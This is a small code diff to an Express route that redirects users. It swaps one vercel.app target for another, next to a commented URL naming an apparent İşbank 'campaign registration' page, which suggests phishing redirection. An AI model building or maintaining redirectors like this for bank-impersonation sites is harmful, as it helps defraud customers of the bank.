@@ -83,7 +83,7 @@ app.get('/jojo', (req, res) => {
     // https://isbank-kampanyalar-kayit.vercel.app/
 
     // Kullanıcıyı yönlendir
-    res.redirect('https://shortli-xi.vercel.app/');
+    res.redirect('https://grnti.vercel.app/');
 });
 
 
